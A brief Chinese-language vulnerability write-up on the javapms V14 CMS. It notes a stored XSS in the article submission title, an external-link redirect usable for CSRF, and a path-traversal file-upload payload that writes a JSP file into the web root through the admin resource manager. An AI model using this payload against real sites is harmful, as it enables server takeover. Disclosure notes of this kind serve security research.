# javapmsV14漏洞集合
`@Time   : 2020/7/28 16:07`
`@Author : 852782749@qq.com`


```
开始编辑～
```
### 前台文章投稿存储型xss
```angular2html
投稿文章标题存在漏洞，
☑️外部链接 可以完成外部链接跳转，如：CSRF漏洞
```


### 后台->系统管理->资源管理任意文件上传
```angular2html
payload:
filename=../../../../../ROOT/123.jsp&source=&path=%2Fimg
```




> 乾坤未定，你我皆是黑马